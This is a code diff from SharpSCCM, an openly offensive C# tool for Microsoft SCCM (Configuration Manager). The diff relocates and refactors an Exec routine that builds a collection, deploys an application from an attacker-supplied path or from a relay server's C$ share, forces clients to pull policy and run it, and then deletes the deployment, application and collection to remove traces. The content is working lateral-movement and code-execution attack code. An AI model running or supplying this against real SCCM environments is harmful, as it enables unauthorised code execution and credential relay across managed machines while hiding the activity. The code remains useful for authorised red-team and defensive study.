@@ -9,6 +9,72 @@ namespace SharpSCCM
 {
     public static class MgmtPointWmi
     {
+        public static void Exec(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string applicationPath = null, string relayServer = null, string resourceId = null, bool runAsUser = true, string collectionType = null, string userName = null)
+        {
+            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
+            // Create a collection is one is not specified
+            if (collection == null)
+            {
+                if (!string.IsNullOrEmpty(resourceId))
+                {
+                    ManagementObject resource = GetDeviceOrUser(wmiConnection, resourceId: resourceId);
+                    collectionType = resource.ClassPath.ClassName == "SMS_R_System" ? "device" : resource.ClassPath.ClassName == "SMS_R_User" ? "user" : null;
+                }
+                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : null;
+                string newCollectionName = $"{char.ToUpper(collectionType[0]) + collectionType.Substring(1)}s_{Guid.NewGuid()}";
+                collection = NewCollection(wmiConnection, collectionType, newCollectionName);
+                NewCollectionMember(wmiConnection, newCollectionName, collectionType, (string)collection["CollectionID"], deviceName, userName, resourceId);
+            }
+            else
+            {
+                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : (uint)collection["CollectionType"] == 2 ? "device" : (uint)collection["CollectionType"] == 1 ? "user" : null;
+            }
+            string newApplicationName = $"Application_{Guid.NewGuid()}";
+            string newDeploymentName = $"{newApplicationName}_{(string)collection["CollectionID"]}_Install";
+            applicationPath = !string.IsNullOrEmpty(relayServer) ? $"\\\\{relayServer}\\C$" : applicationPath;
+            NewApplication(wmiConnection, newApplicationName, applicationPath, runAsUser, true);
+            NewDeployment(wmiConnection, newApplicationName, null, (string)collection["CollectionID"]);
+            Console.WriteLine("[+] Waiting for new deployment to become available...");
+            bool deploymentAvailable = false;
+            while (!deploymentAvailable)
+            {
+                Thread.Sleep(millisecondsTimeout: 5000);
+                ManagementObjectCollection deployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", whereCondition: $"AssignmentName='{newDeploymentName}'");
+                if (deployments.Count == 1)
+                {
+                    Console.WriteLine("[+] New deployment is available, waiting 30 seconds for updated policy to become available");
+                    Thread.Sleep(millisecondsTimeout: 30000);
+                    deploymentAvailable = true;
+                }
+                else
+                {
+                    Console.WriteLine("[+] New deployment is not available yet... trying again in 5 seconds");
+                }
+            }
+            if (collectionType == "device")
+            {
+                UpdateMachinePolicy(wmiConnection, (string)collection["CollectionID"]);
+                Console.WriteLine("[+] Waiting 1 minute for execution to complete...");
+                Thread.Sleep(60000);
+            }
+            else if (collectionType == "user")
+            {
+                UpdateUserPolicy(wmiConnection, (string)collection["CollectionID"]);
+            }
+            Console.WriteLine("[+] Cleaning up");
+            Cleanup.RemoveDeployment(wmiConnection, newDeploymentName);
+            Cleanup.RemoveApplication(wmiConnection, newApplicationName);
+            // Only delete the collection if not using an existing collection
+            if (string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName))
+            {
+                Cleanup.RemoveCollection(wmiConnection, null, (string)collection["CollectionID"]);
+            }
+        }
+
+        public static void InvokeLastLogonUpdate(ManagementScope wmiConnection, string collectionName)
+        {
+            // TODO
+        }
         public static void GenerateCCR(string target, string server = null, string siteCode = null)
         {
             ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, null, siteCode);
@@ -157,7 +223,7 @@ namespace SharpSCCM
                                                 $"Collection Name: {existingCollectionName}\n" +
                                                 $"RuleName: {collectionRule["RuleName"]}\n" +
                                                 $"QueryID: {collectionRule["QueryID"]}\n" +
-                                                $"Query Expression:{collectionRule["QueryExpression"]}");
+                                                $"Query Expression: {collectionRule["QueryExpression"]}");
                                             }
                                         }
                                         foreach (ManagementObject collectionRuleQueryResult in collectionRuleQueryResults)
@@ -519,9 +585,14 @@ namespace SharpSCCM
             }
         }
 
-        public static void Exec(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string applicationPath = null, string relayServer = null, string resourceId = null, bool runAsUser = true, string collectionType = null, string userName = null)
+        public static void UpdateMachinePolicy(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string resourceId = null, string userName = null)
         {
-            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
+            string collectionType = null;
+            ManagementObject collection = null;
+            if (!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName))
+            {
+                collection = GetCollection(wmiConnection, collectionName, collectionId);
+            }
             // Create a collection is one is not specified
             if (collection == null)
             {
@@ -537,62 +608,12 @@ namespace SharpSCCM
             }
             else
             {
-                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : (uint)collection["CollectionType"] == 2 ? "device" : (uint)collection["CollectionType"] == 1 ? "user" : null;
+                collectionType = (uint)collection["CollectionType"] == 2 ? "device" : (uint)collection["CollectionType"] == 1 ? "user" : null;
             }
-            string newApplicationName = $"Application_{Guid.NewGuid()}";
-            string newDeploymentName = $"{newApplicationName}_{(string)collection["CollectionID"]}_Install";
-            applicationPath = !string.IsNullOrEmpty(relayServer) ? $"\\\\{relayServer}\\C$" : applicationPath;
-            NewApplication(wmiConnection, newApplicationName, applicationPath, runAsUser, true);
-            NewDeployment(wmiConnection, newApplicationName, null, (string)collection["CollectionID"]);
-            Console.WriteLine("[+] Waiting for new deployment to become available...");
-            bool deploymentAvailable = false;
-            while (!deploymentAvailable)
-            {
-                Thread.Sleep(millisecondsTimeout: 5000);
-                ManagementObjectCollection deployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", whereCondition: $"AssignmentName='{newDeploymentName}'");
-                if (deployments.Count == 1)
-                {
-                    Console.WriteLine("[+] New deployment is available, waiting 30 seconds for updated policy to become available");
-                    Thread.Sleep(millisecondsTimeout: 30000);
-                    deploymentAvailable = true;
-                }
-                else
-                {
-                    Console.WriteLine("[+] New deployment is not available yet... trying again in 5 seconds");
-                }
-            }
-            if (collectionType == "device")
-            {
-                UpdateMachinePolicy(wmiConnection, (string)collection["CollectionID"]);
-                Console.WriteLine("[+] Waiting 1 minute for execution to complete...");
-                Thread.Sleep(60000);
-            }
-            else if (collectionType == "user")
-            {
-                UpdateUserPolicy(wmiConnection, (string)collection["CollectionID"]);
-            }
-            Console.WriteLine("[+] Cleaning up");
-            Cleanup.RemoveDeployment(wmiConnection, newDeploymentName);
-            Cleanup.RemoveApplication(wmiConnection, newApplicationName);
-            // Only delete the collection if not using an existing collection
-            if (string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName))
-            {
-                Cleanup.RemoveCollection(wmiConnection, null, (string)collection["CollectionID"]);
-            }
-        }
-        
-        public static void InvokeLastLogonUpdate(ManagementScope wmiConnection, string collectionName)
-        {
-            // TODO
-        }
-
-        public static void UpdateMachinePolicy(ManagementScope wmiConnection, string collectionId = null, string collectionName = null)
-        {
             ManagementClass clientOperation = new ManagementClass(wmiConnection, new ManagementPath("SMS_ClientOperation"), null);
             ManagementBaseObject initiateClientOpParams = clientOperation.GetMethodParameters("InitiateClientOperation");
             initiateClientOpParams.SetPropertyValue("Type", 8); // RequestPolicyNow
 
-            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
             Console.WriteLine($"[+] Forcing all members of {collection["Name"]} ({collection["CollectionID"]}) to retrieve machine policy and execute any new applications available");
             try
             {
